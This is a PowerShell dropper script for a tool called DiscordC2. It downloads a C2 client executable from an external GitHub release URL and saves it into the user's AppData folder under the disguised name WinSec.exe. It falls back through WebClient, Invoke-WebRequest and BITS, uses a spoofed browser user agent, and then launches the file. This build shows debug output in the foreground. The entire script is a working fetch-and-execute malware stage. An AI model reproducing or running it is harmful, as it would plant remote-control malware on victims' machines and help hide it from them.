# DiscordC2 — Dropper (FOREGROUND DEBUG MODE)
# Author: IMApurbo
# https://github.com/IMApurbo/discordC2

$ErrorActionPreference = 'Continue'

# ── config ────────────────────────────────────────────────────
$url  = "https://github.com/IMApurbo/discordC2/releases/download/C2/c2_client.exe"
$dest = "$env:APPDATA\Microsoft\Windows\WinSec.exe"

# ── banner ────────────────────────────────────────────────────
Write-Host ""
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "   DiscordC2 Dropper — Debug Mode              " -ForegroundColor Cyan
Write-Host "   github.com/IMApurbo/discordC2               " -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host ""

# ── create destination folder ─────────────────────────────────
Write-Host "[*] Destination : $dest" -ForegroundColor Yellow
$folder = Split-Path $dest
if (!(Test-Path $folder)) {
    Write-Host "[*] Creating folder : $folder" -ForegroundColor Yellow
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
    Write-Host "[+] Folder created" -ForegroundColor Green
} else {
    Write-Host "[+] Folder exists" -ForegroundColor Green
}

# ── download ──────────────────────────────────────────────────
Write-Host ""
Write-Host "[*] Downloading EXE..." -ForegroundColor Yellow
Write-Host "    URL : $url" -ForegroundColor Gray

$downloaded = $false

# method 1 — WebClient
Write-Host "[*] Trying WebClient..." -ForegroundColor Yellow
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($url, $dest)
    Write-Host "[+] WebClient succeeded" -ForegroundColor Green
    $downloaded = $true
} catch {
    Write-Host "[-] WebClient failed : $_" -ForegroundColor Red
}

# method 2 — Invoke-WebRequest
if (!$downloaded) {
    Write-Host "[*] Trying Invoke-WebRequest..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $url `
                          -OutFile $dest `
                          -UseBasicParsing `
                          -UserAgent "Mozilla/5.0"
        Write-Host "[+] Invoke-WebRequest succeeded" -ForegroundColor Green
        $downloaded = $true
    } catch {
        Write-Host "[-] Invoke-WebRequest failed : $_" -ForegroundColor Red
    }
}

# method 3 — BITS
if (!$downloaded) {
    Write-Host "[*] Trying BITS transfer..." -ForegroundColor Yellow
    try {
        Import-Module BitsTransfer
        Start-BitsTransfer -Source $url -Destination $dest
        Write-Host "[+] BITS succeeded" -ForegroundColor Green
        $downloaded = $true
    } catch {
        Write-Host "[-] BITS failed : $_" -ForegroundColor Red
    }
}

# ── verify ────────────────────────────────────────────────────
Write-Host ""
Write-Host "[*] Verifying download..." -ForegroundColor Yellow

if (!(Test-Path $dest)) {
    Write-Host "[-] File not found at destination!" -ForegroundColor Red
    Write-Host "[-] Download failed completely." -ForegroundColor Red
    Write-Host ""
    Read-Host "Press ENTER to exit"
    exit 1
}

$size = (Get-Item $dest).Length
$sizeMB = [math]::Round($size / 1MB, 2)
Write-Host "[+] File exists  : $dest" -ForegroundColor Green
Write-Host "[+] File size    : $sizeMB MB ($size bytes)" -ForegroundColor Green

if ($size -lt 100000) {
    Write-Host "[-] File too small — download probably failed or corrupted!" -ForegroundColor Red
    Remove-Item $dest -Force
    Write-Host ""
    Read-Host "Press ENTER to exit"
    exit 1
}

Write-Host "[+] File looks valid" -ForegroundColor Green

# ── run ───────────────────────────────────────────────────────
Write-Host ""
Write-Host "[*] Launching EXE..." -ForegroundColor Yellow
Write-Host "    Path : $dest" -ForegroundColor Gray

try {
    # run directly — visible/foreground so you can see it
    Start-Process -FilePath $dest -Wait
    Write-Host "[+] Process started" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to launch : $_" -ForegroundColor Red
}

# ── done ──────────────────────────────────────────────────────
Write-Host ""
Write-Host "================================================" -ForegroundColor Cyan
Write-Host "   Done." -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan
Write-Host ""
Read-Host "Press ENTER to close"
